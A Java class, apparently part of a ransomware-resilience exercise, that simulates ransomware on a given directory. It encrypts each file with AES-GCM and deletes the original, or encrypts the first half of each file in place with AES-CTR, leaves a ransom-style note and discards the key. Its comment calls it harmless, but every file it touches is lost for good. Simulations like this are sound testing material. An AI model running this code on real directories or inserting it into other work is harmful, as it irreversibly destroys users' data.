package com.jk.explore.security.ransomres;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.GeneralSecurityException;
import java.security.SecureRandom;
import java.util.List;
import java.util.Set;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.IvParameterSpec;

/**
 * A harmless simulation of ransomware: it only touches the directory it is given. The key is made in memory and thrown away,
 * so nobody can decrypt what it did.
 */
final class Ransomware {

    static final String NOTE = "README_RESTORE.txt";

    private Ransomware() {
    }

    /** Encrypts every file with AES-256-GCM into name.locked and deletes the original; files named in skip are left alone. Returns the number encrypted. */
    static int encryptAndDelete(Path dir, Set<String> skip) throws IOException, GeneralSecurityException {
        SecretKey key = newKey();
        SecureRandom random = new SecureRandom();
        int count = 0;
        for (Path file : files(dir)) {
            if (skip.contains(file.getFileName().toString())) {
                continue;
            }
            byte[] iv = new byte[12];
            random.nextBytes(iv);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
            byte[] encrypted = cipher.doFinal(Files.readAllBytes(file));
            byte[] out = new byte[iv.length + encrypted.length];
            System.arraycopy(iv, 0, out, 0, iv.length);
            System.arraycopy(encrypted, 0, out, iv.length, encrypted.length);
            Files.write(dir.resolve(file.getFileName() + ".locked"), out);
            Files.delete(file);
            count++;
        }
        Files.writeString(dir.resolve(NOTE), "Your ledger files are encrypted. This is a classroom simulation; the key was thrown away.\n");
        return count;
    }

    /** The slow kind: only the first half of every file is encrypted, in place, with AES-CTR, so the name and the size stay the same. */
    static int encryptHalfInPlace(Path dir, Set<String> skip) throws IOException, GeneralSecurityException {
        SecretKey key = newKey();
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);
        int count = 0;
        for (Path file : files(dir)) {
            if (skip.contains(file.getFileName().toString())) {
                continue;
            }
            byte[] data = Files.readAllBytes(file);
            Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(iv));
            byte[] half = cipher.doFinal(data, 0, data.length / 2);
            System.arraycopy(half, 0, data, 0, half.length);
            Files.write(file, data);
            count++;
        }
        return count;
    }

    static List<Path> files(Path dir) throws IOException {
        try (var stream = Files.list(dir)) {
            return stream.filter(Files::isRegularFile).sorted().toList();
        }
    }

    private static SecretKey newKey() throws GeneralSecurityException {
        KeyGenerator generator = KeyGenerator.getInstance("AES");
        generator.init(256);
        return generator.generateKey();
    }
}
